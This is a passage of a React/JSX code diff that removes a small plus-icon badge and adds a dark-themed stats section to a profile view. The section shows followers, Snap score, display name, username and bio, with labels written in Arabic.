               <div style={{ position: 'absolute', bottom: 3, right: 3, width: 14, height: 14, borderRadius: '50%', backgroundColor: '#00C96B', border: '2px solid #000' }} />
-              <div style={{ position: 'absolute', bottom: -2, left: -4, width: 22, height: 22, borderRadius: '50%', backgroundColor: '#0ECDC4', border: '2px solid #000', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 1px 6px rgba(0,0,0,0.5)' }}>
-                <svg width="11" height="11" viewBox="0 0 11 11" fill="white"><line x1="5.5" y1="1" x2="5.5" y2="10" stroke="white" strokeWidth="2" strokeLinecap="round"/><line x1="1" y1="5.5" x2="10" y2="5.5" stroke="white" strokeWidth="2" strokeLinecap="round"/></svg>
-              </div>
             </div>
           </div>
+        </div>
+
+        {/* ─── Stats section ─── */}
+        <div style={{ backgroundColor: '#0A0A0A', margin: '0 0 2px', padding: '14px 16px', borderBottom: '0.5px solid rgba(255,255,255,0.06)' }}>
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 10 }}>
+            {/* Followers */}
+            <div style={{ backgroundColor: '#141414', borderRadius: 14, padding: '12px 14px', direction: 'rtl', border: '0.5px solid rgba(255,255,255,0.06)' }}>
+              <p style={{ color: '#555', fontSize: 10, margin: '0 0 4px', letterSpacing: 0.5, textTransform: 'uppercase' }}>المتابعون</p>
+              <p style={{ color: 'white', fontSize: 18, fontWeight: 900, margin: 0, fontFamily: 'monospace' }}>{fmtNum(profile.subscriberCount)}</p>
+            </div>
+            {/* Snap Score */}
+            <div style={{ backgroundColor: '#141414', borderRadius: 14, padding: '12px 14px', direction: 'rtl', border: '0.5px solid rgba(255,255,255,0.06)' }}>
+              <p style={{ color: '#555', fontSize: 10, margin: '0 0 4px', letterSpacing: 0.5, textTransform: 'uppercase' }}>نقاط سناب</p>
+              <p style={{ color: Y, fontSize: 18, fontWeight: 900, margin: 0, fontFamily: 'monospace' }}>{fmtNum(profile.snapScore)}</p>
+            </div>
+            {/* Display name */}
+            <div style={{ backgroundColor: '#141414', borderRadius: 14, padding: '12px 14px', direction: 'rtl', border: '0.5px solid rgba(255,255,255,0.06)' }}>
+              <p style={{ color: '#555', fontSize: 10, margin: '0 0 4px', letterSpacing: 0.5, textTransform: 'uppercase' }}>اسم الحساب</p>
+              <p style={{ color: 'white', fontSize: 14, fontWeight: 700, margin: 0 }}>{profile.displayName}</p>
+            </div>
+            {/* Username */}
+            <div style={{ backgroundColor: '#141414', borderRadius: 14, padding: '12px 14px', direction: 'rtl', border: '0.5px solid rgba(255,255,255,0.06)' }}>
+              <p style={{ color: '#555', fontSize: 10, margin: '0 0 4px', letterSpacing: 0.5, textTransform: 'uppercase' }}>المعرّف</p>
+              <p style={{ color: 'rgba(200,200,200,0.85)', fontSize: 13, fontWeight: 700, margin: 0, fontFamily: 'monospace' }}>{handle}</p>
+            </div>
+          </div>
+          {/* Bio */}
+          {profile.bio && (
+            <div style={{ backgroundColor: '#141414', borderRadius: 14, padding: '12px 14px', direction: 'rtl', border: '0.5px solid rgba(255,255,255,0.06)', marginTop: 10 }}>
+              <p style={{ color: '#555', fontSize: 10, margin: '0 0 5px', letterSpacing: 0.5, textTransform: 'uppercase' }}>النبذة التعريفية</p>
+              <p style={{ color: 'rgba(220,220,220,0.85)', fontSize: 13, margin: 0, lineHeight: 1.5 }}>{profile.bio}</p>
+            </div>
+          )}
         </div>
 
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px 6px', backgroundColor: '#000' }}>
